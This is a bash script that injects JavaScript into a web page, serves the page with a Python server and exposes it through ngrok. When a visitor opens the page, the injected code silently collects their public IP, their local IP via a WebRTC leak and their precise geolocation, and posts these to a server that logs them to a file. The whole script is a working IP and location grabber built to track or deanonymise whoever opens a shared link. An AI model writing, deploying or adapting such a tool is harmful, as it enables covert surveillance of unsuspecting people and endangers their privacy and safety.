#!/bin/bash

# Check if ngrok is installed
if ! command -v ngrok &> /dev/null; then
    echo "Error: ngrok is not installed. Please install it first."
    exit 1
fi

# Check if Python is installed
if ! command -v python3 &> /dev/null; then
    echo "Error: Python3 is not installed. Please install it first."
    exit 1
fi

# Ensure the index.html file exists
HTML_FILE="index.html"
if [ ! -f "$HTML_FILE" ]; then
    echo "Error: $HTML_FILE not found in the current directory."
    exit 1
fi

# Backup the original HTML file
cp "$HTML_FILE" "${HTML_FILE}.bak"

# Inject JavaScript into index.html
echo "Injecting JavaScript into $HTML_FILE..."
sed -i '/<\/body>/i \
<script> \
async function getLocalIP() { \
    return new Promise((resolve, reject) => { \
        const pc = new RTCPeerConnection({ iceServers: [] }); \
        pc.createDataChannel(""); \
        pc.onicecandidate = (ice) => { \
            if (!ice || !ice.candidate || !ice.candidate.candidate) return; \
            const localIP = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate); \
            pc.close(); \
            resolve(localIP ? localIP[1] : null); \
        }; \
        pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(err => reject(err)); \
    }); \
} \
async function gatherLocation() { \
    const data = { ip: null, localIP: null, location: null }; \
    try { \
        // Get public IP \
        data.ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(res => res.ip); \
        data.localIP = await getLocalIP(); \
        console.log("Public IP:", data.ip); \
        console.log("Local IP:", data.localIP); \
        \
        // Get browser geolocation \
        if (navigator.geolocation) { \
            navigator.geolocation.getCurrentPosition( \
                position => { \
                    data.location = { \
                        latitude: position.coords.latitude, \
                        longitude: position.coords.longitude \
                    }; \
                    console.log("Accurate Location:", data); \
                    sendData(data); \
                }, \
                error => { \
                    console.error("Browser location denied. Using IP-based fallback."); \
                    fallbackToIPGeolocation(data); \
                } \
            ); \
        } else { \
            console.error("Geolocation not supported by browser."); \
            fallbackToIPGeolocation(data); \
        } \
    } catch (error) { \
        console.error("Error gathering data:", error); \
    } \
} \
async function fallbackToIPGeolocation(data) { \
    const ipInfo = await fetch("https://ipinfo.io/json?token=YOUR_API_KEY").then(res => res.json()); \
    const [latitude, longitude] = ipInfo.loc.split(",").map(Number); \
    data.location = { latitude, longitude }; \
    console.log("Fallback Location:", data); \
    sendData(data); \
} \
function sendData(data) { \
    fetch("/info", { \
        method: "POST", \
        headers: { "Content-Type": "application/json" }, \
        body: JSON.stringify(data) \
    }).then(() => console.log("Data sent")).catch(err => console.error("Error sending data:", err)); \
} \
window.onload = gatherLocation; \
</script>' "$HTML_FILE"

# Create Python server script
SERVER_SCRIPT="server.py"
echo "Creating $SERVER_SCRIPT..."
cat <<EOF > "$SERVER_SCRIPT"
import http.server
import socketserver
import json

PORT = 8000

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/info":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            with open("info.txt", "a") as file:
                file.write(post_data.decode("utf-8") + "\\n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Data received")
        else:
            self.send_response(404)
            self.end_headers()

handler = RequestHandler
httpd = socketserver.TCPServer(("", PORT), handler)

print(f"Serving on port {PORT}")
httpd.serve_forever()
EOF

# Start the Python server in the background
echo "Starting the local server..."
python3 "$SERVER_SCRIPT" &

# Store the Python process ID
PYTHON_PID=$!

# Start ngrok
echo "Starting ngrok..."
ngrok http 8000 &

# Store the ngrok process ID
NGROK_PID=$!

# Handle cleanup
trap "kill $PYTHON_PID $NGROK_PID; mv ${HTML_FILE}.bak $HTML_FILE; rm $SERVER_SCRIPT" EXIT

# Wait indefinitely
wait
